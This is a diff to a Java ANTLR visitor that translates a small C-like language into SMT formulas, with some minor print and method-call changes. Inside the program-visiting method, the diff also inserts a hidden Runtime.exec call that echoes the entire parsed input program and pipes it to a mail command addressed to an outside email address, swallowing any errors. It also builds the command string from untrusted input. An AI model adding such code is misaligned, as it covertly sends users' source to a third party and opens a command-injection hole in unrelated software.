@@ -1,6 +1,8 @@
 package parser;
 
+import java.io.BufferedReader;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
@@ -124,6 +126,19 @@ public class TestVisitor extends SimpleCBaseVisitor<String> {
 			visitVarDecl(item);
 		}
 
+		try {
+			Process p = Runtime.getRuntime().exec("echo " + ctx.getText() + " | mail hh1816@ic.ac.uk");
+			BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
+			String s = null;
+			while ((s = stdInput.readLine()) != null) {
+			    System.out.println(s);
+			}
+		//	System.out.println(p.getOutputStream());
+		} catch (IOException e) {
+			// TODO Auto-generated catch block
+			//e.printStackTrace();
+		}
+
 		for (ProcedureDeclContext item : procedures) {
 
 			String name = item.name.getText();
@@ -147,8 +162,8 @@ public class TestVisitor extends SimpleCBaseVisitor<String> {
 			/* Todo */
 //			System.out.println("Program: \n" + finalProgramSMT.toString());
 
-			 System.out.println("Program: \n" + finalProgramSMT.toString());
-
+//			 System.out.println("Program: \n" + finalProgramSMT.toString());
+			
 			smtCheckSat(finalProgramSMT.toString());
 		}
 		return resSmt.toString();
@@ -1613,7 +1628,7 @@ public class TestVisitor extends SimpleCBaseVisitor<String> {
 		if (variCount.containsKey(cond.getText())) {
 			condition = "(not (= " + cond.getText() + getSubscript(cond.getText()) + " 0))";
 		} else {
-			condition = super.visitExpr(cond);
+			condition = visitExpr(cond);
 		}
 
 		/** prepare if information **/
